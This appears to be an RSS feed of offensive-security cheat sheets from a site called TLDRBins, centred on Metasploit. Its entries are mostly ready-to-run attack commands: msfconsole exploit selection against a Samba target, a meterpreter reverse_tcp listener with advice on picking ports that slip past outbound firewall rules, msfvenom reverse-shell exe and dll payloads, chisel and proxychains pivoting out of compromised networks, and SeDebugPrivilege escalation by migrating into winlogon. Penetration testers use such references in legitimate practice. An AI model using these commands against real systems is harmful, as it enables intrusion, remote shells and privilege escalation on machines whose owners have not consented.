channel.title: Metasploit on TLDRBins
channel.description: Recent content in Metasploit on TLDRBins

item.title: Metasploit
item.description: msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts <TARGET> set lhost <LOCAL_IP> set lport <LOCAL_PORT> # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> set lport <LOCAL_PORT> set AutoRunScript multi_console_command -r automigrate.

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.

item.title: Network Traffic Pivoting
item.description: Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port <LOCAL_PORT> Ports forwarding # In target machine ./chisel client <LOCAL_IP>:<LOCAL_PORT> R:<TARGET_PORT>:127.0.0.1:<TARGET_PORT> # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client <LOCAL_IP>:<LOCAL_PORT> R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1081 # In target machine .

item.title: SeDebugPrivilege
item.description: Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate <PID> # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>" Ref: psgetsys
